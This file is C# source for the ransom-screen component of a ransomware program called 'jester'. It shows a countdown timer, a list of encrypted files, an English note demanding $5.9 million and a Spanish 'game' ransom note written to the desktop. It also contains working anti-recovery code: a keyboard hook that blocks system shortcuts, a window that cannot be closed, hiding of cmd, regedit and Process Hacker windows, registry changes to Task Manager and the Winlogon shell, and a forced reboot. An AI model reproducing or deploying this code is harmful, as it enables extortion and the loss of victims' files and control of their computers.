using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Drawing;
using Microsoft.Win32;
using System.IO;
using System.Net;
using System.Reflection;
using System.Media;

namespace jester
{
    public partial class PayM3 : Form
    {
        //These dll import are for gdi payloads, do not change
        [DllImport("gdi32.dll", ExactSpelling = true)]
        private static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);
  

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        public const int DIRTY = 8658951;
        public const int NORMAL = 13369376;

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;        // x position of upper-left corner
            public int Top;         // y position of upper-left corner
            public int Right;       // x position of lower-right corner
            public int Bottom;      // y position of lower-right corner
        }

        [DllImport("user32.dll")]
       
        static extern IntPtr GetDCEx(IntPtr hwnd, IntPtr hrgn, uint flags);

        [System.Runtime.InteropServices.DllImport("gdi32.dll")]
        internal static extern bool Rectangle(IntPtr hdc, int ulCornerX, int ulCornerY, int lrCornerX, int lrCornerY);

        [DllImport("User32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC([In] IntPtr hdc);

     
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        [DllImport("User32")]

        private static extern int ShowWindow(int hwnd, int nCmdShow);

        //for BlockMouse
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        private bool success = false;
        private SoundPlayer back_snd;
        public PayM3()
        {


            InitializeComponent();
            label4.Text = TimeSpan.FromMinutes(720).ToString(); //set countdowntimer to 720 minutes
            label2.Text = Program.count.ToString() + " Total encrypted";
            listBox1.Items.AddRange(Program.encryptedFiles.ToArray());
            textBox2.Text =
                 "To get the key to decrypt files, you have to pay $ 5.9 million.  \n\r" +
                "f the payment is not made tomorrow night, we will lock the entire system.\n\r" +
                "More instructions coming soon. - jester.";



        } 
          public int tootalsecs = 720* 60;



        private void Button1_Click(object sender, EventArgs e)
        {
            string input = textBox1.Text;

            if (CheckPassword(input.ToCharArray()))
            {
                success = true;
                button1.Text = "Decrypting... Please wait";
                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                //Enable taskmanager
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                //Repair shell
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
                backgroundWorker1.RunWorkerAsync(input);
                
               System.Diagnostics.Process.Start(@"C:\Windows\Temp\delete.exe");
            }
            else
            {
                textBox1.Text = string.Empty;
                ActiveControl = textBox1;
                button1.Text = "Wrong Password... ";
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
               
               
            }
        }

        private bool CheckPassword(char[] input)
        {
            char[] password = Program.GetPass();
            if (password.Length == input.Length)
            {
                for (int i = 0; i < input.Length; i++)
                {
                    if (password[i] != input[i])
                    {
                        return false;
                    }
                }
                return true;
            }
        return false;
        }


        private void Screen_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Block window from being closed using Alt + F4
            if (!success)
                e.Cancel = true;
        }

        private void PayM3_Load(object sender, EventArgs e)

        {
            //Play music if exists
            if (File.Exists(@"C:\Windows\Temp\music.wav"))
            {
                back_snd = new SoundPlayer(@"C:\Windows\Temp\music.wav");
                back_snd.Play();
            }


            // Make this the active window
            //WindowState = FormWindowState.Minimized;
            Show();
            this.Opacity = 0.0;
            this.Size = new Size(100, 100);      //Invisible
            Location = new Point(-100, -100);
      
         


            //Make countdowntimer
            var startTime = DateTime.Now;

            var timer = new Timer() { Interval = 1000 };

            timer.Tick += (obj, args) =>
            {
                if (tootalsecs == 0)
                {
                    timer.Stop();
                    MessageBox.Show("deleting files ..", "time over", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    

                }
                else
                {
                    label4.Text =
                   (TimeSpan.FromMinutes(720) - (DateTime.Now - startTime))
                       .ToString("hh\\:mm\\:ss");
                    tootalsecs--;
                }
            };
           

            timer.Enabled = true;
            //Payloads
            timer.Start();
            tmr_hide.Start(); //show window again
            tmr_show.Start(); //delete desktop.ini because we cant encrypt desktop.ini files
            tmr_if.Start(); //Block cmd, register...
            tmr_encrypt.Start(); //Start locking files
            tmr_clock.Start(); //If you see on window 00:00:00, system will kill


            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            using (StreamWriter streamWriter = File.CreateText(path + @"\jester.html")) //Create file
            {
                streamWriter.WriteLine("Quiero jugar un juego contigo. Dejame explicarte las reglas: " +
                     "Tus archivos personales se borraran. Tus fotos, videos, documentos, etc." +
                     "¡Pero no te preocupes Solo sucederá si no cumple.Sin embargo, " +
                     "ya cifre sus archivos personales, por lo que no puede acceder a ellos" +
                     " alterminar el timpo eliminare todos tus archivos  de forma permanente, por lo que tampoco podré acceder a ellos" +
                     ".Si apaga la computadora o intenta cerrarme, la proxima vez que comience" +
                     "se eliminarán 1000 archivos como castigo. Si, querrá que comience la proxima vez, ya que soy el unico  uno que  sea capaz " +
                     "de descifrar sus datos personales por usted" +
                     "¡Ahora, comencemos y disfrutemos nuestro pequeño juego juntos!"); //Text for file

            }
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
        }

        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            string input = e.Argument as string;
            Program.UndoAttack(input);

        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Application.Exit();
        }

        /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Starts Here */

        // Structure contain information about low-level keyboard input event 
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        //System level functions to be used for hook and unhook keyboard input  
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);

        //Declaring Global objects     
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));

                // Disabling Windows keys 
                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1; // if 0 is returned then All the above keys will be enabled
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }

        private void tmr_hide_Tick(object sender, EventArgs e)
        {
            tmr_hide.Stop();
            this.Opacity = 100.0;
            this.Size = new Size(1089, 690);
            Location = new Point(500, 500);
            Thawouse(); //Anti freeze
        }
      

        private void tmr_show_Tick(object sender, EventArgs e)
        {
  

        }

        private void tmr_if_Tick(object sender, EventArgs e)
        {
            tmr_if.Stop();
            int hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "cmd")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "regedit")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "Processhacker")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "sdclt")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
            }
            tmr_if.Start();
        }

        private void tmr_encrypt_Tick(object sender, EventArgs e)
        {

        }

        private void tmr_clock_Tick(object sender, EventArgs e)
        {
            tmr_clock.Stop();
            Process[] _process = null;
            _process = Process.GetProcessesByName("jester");
            foreach (Process proces in _process)
            {
                Process.Start("shutdown", "/r /t 0");
                proces.Kill();
            }
            this.Close();

        }
        public static void Thawouse() //unfreeze
        {
            BlockInput(false);
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

    

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

 

        private void button2_Click(object sender, EventArgs e)
        {

            var NewForm = new NOTE();
            NewForm.ShowDialog();
        }
    }
}

   


